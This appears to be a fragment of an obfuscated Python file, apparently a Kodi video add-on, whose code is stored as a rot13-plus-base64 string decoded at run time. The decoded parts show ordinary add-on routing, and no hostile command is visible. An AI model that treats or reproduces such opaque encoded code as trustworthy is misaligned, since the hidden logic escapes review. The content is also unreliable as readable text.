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toTIhXT5yq2AipUxcCwN6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzo3VtqTuyK2gyrH8fVUEbMI92LJk1MH8tnJ4tozI3L29jrF5cqTIlnKEyoKZbXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvO0nTIsqzSfqJICVTymVT5iqPOBo25yBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzo3VtqTuyK2gyrFjtqTuyK3MuoUIyVTyhVUEbMI92LJk1MH8hnKEypzy0MJ1mXPx6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOcMvO0nTIsqzSfqJHtnKZtoz90VR5iozH6VPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNAPvNtVPNtVPNtVlNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDtVPqeMKxtLJ5xVUMuoPpfqTuyK2gyrFjtqTuyK3MuoUIyQDbtVPNtVPNtVPZtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50VPquLFpAPvNtVPNtVPNtVlNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDtW1faVPftpzIaMKuhLJ1yXlphpTSlLJ0aX3A0pvucXmRcVPftW10aQDbtVPNtVPNtVPZtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50VUWypUVbo2WdJ2yqXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVUE5pTHbqTuyK3MuoUIyXFOcplOxnJA0Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzo3VtqTuyK2gyrJjfVUEbMI92LJk1MJjtnJ4tqTuyK3MuoUIyYzy0MKWcqTIgpltcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtqTuyK3MuoUIyoPOcplOho3DtGz9hMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9Gz9hMD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTymnJ5mqTShL2Hbo2WdYUE1pTkyXGbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCFOiLzconI0hMTIwo2EyXPq1qTLgBPpcVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUD6VN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCFOiLzconI0tQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCFOiLzbhMTIwo2EyXPq1qTLgBPpcVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUD6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9VT9vnt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVPqoWlNeVUWyM2I4ozSgMFfaYaOupzSgWlgmqUVbnFfkXFNeVPqqJ0ESKFptnJ4tqTuyK3MuoUIyoQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqTuyK3MuoUIyoQ10nTIsqzSfqJIfYaWypTkuL2HbW1faVPftpzIaMKuhLJ1yXlphpTSlLJ0aX3A0pvucXmRcVPftW11oERIqWljtqJ5yp2AupTHbqzSfXFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO0nTIsqzSfqJIoqTuyK2gyrJkqCKEbMI92LJk1MJjhpzIjoTSwMFtaJlptXlOlMJqyrT5uoJHeWl5jLKWuoFpep3ElXTxeZFxtXlNaKFpfVUMuoPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNwpUWcoaDtW2McpaA0VUAyLlpfqTuyK3MuoUIyJ3EbMI9eMKyfKD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTIfp2H6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUMuoQ1Bo25yQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTymnJ5mqTShL2Hbo2WdYUE1pTkyXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCJ9vnygcKF5xMJAiMTHbW3I0Mv04WlxtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUD6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCJ9vnygcKFNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9VT9vnv5xMJAiMTHbW3I0Mv04WlxtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOyrTAypUD6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqzSfCFOiLzbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtW1faVPftpzIaMKuhLJ1yXlphpTSlLJ0aX3A0pvucXmRcVPftW11oERIqWlOcovO0nTIsqzSfqJH6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNwpUWcoaDtW2MiqJ5xVRESWlk0nTIsqzSfqJHhpzIjoTSwMFtaJlptXlOlMJqyrT5uoJHeWl5jLKWuoFpep3ElXTxeZFxtXlNaKIgREI0aYPO1ozImL2SjMFu2LJjcXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqTuyK3MuoUIyCKEbMI92LJk1MF5lMKOfLJAyXPqoWlNeVUWyM2I4ozSgMFfaYaOupzSgWlgmqUVbnFfkXFNeVPqqJ0ESKFpfVUIhMKAwLKOyXUMuoPxcQDbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtqTuyK3MuoUIyG1g0nTIsn2I5KG10nTIsqzSfqJHhpzIjoTSwMFtaJlptXlOlMJqyrT5uoJHeWl5jLKWuoFpep3ElXTxeZFxtXlNaKFpfVUMuoPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtV3OlnJ50VPqmMJAiozDtp2IwVUMuoPpfqTuyK3MuoUIyG1g0nTIsn2I5KD0XQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUMuoQ1Bo25yQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTymnJ5mqTShL2Hbo2WdYUE1pTkyXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9o2WdJ2yqYzEyL29xMFtaqKEzYGtaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUMuoQ1iLzconI0APvNtVPNtVPNtVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9o2WdYzEyL29xMFtaqKEzYGtaXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtMKuwMKO0BvNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO2LJj9o2WdQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVPqoWlNeVUWyM2I4ozSgMFfaYaOupzSgWlgmqUVbnFfkXFNeVPqqJ0ESKFptnJ4toTymqUWypTIuqSD6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOfnKA0pzIjMJS0IQ1fnKA0pzIjMJS0IP5lMKOfLJAyXPqoWlNeVUWyM2I4ozSgMFfaYaOupzSgWlgmqUVbnFfkXFNeVPqqJ0ESKFpfqzSfXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOfnKA0pzIjMJS0IQ1fnKA0pzIjMJS0IP5lMKOfLJAyXPqoWlNeVUWyM2I4ozSgMFfaYaOupzSgWlgmqUVbnFfkXFNeVPqqWlkyp2AupTHbqzSfXFxAPvZtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50VTkcp3ElMKOyLKEHQDbtVPNtVPNtVPNtVPNtVPNtoTymqUWypTIuqSD9oTymqUWypTIuqSDhpzIjoTSwMFtaJlptXlOlMJqyrT5uoJHeWl5jLKWuoFpep3ElXQNcVPftW10aYUA0pvuloaIgLzIlXFxtQDbtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPN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'
joy = '\x72\x6f\x74\x31\x33'
